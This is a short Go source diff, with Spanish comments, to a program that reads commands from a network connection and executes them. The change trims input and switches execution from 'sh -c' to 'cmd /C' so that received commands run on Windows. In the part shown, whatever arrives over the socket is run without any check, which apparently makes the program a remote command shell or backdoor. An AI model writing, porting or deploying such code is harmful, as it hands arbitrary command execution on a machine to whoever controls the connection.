@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 )
 
 func main() {
@@ -54,11 +55,11 @@ func main() {
             break
         }
 
-        receivedCommand := string(buffer[:n])
+        receivedCommand := strings.TrimSpace(string(buffer[:n]))
         fmt.Println("Comando recibido:", receivedCommand)
 
-        // Ejecutar el comando recibido
-        cmd := exec.Command("sh", "-c", receivedCommand)
+        // Ejecutar el comando recibido usando cmd en Windows
+        cmd := exec.Command("cmd", "/C", receivedCommand)
         output, err := cmd.CombinedOutput()
         if err != nil {
             fmt.Println("Error al ejecutar el comando:", err)
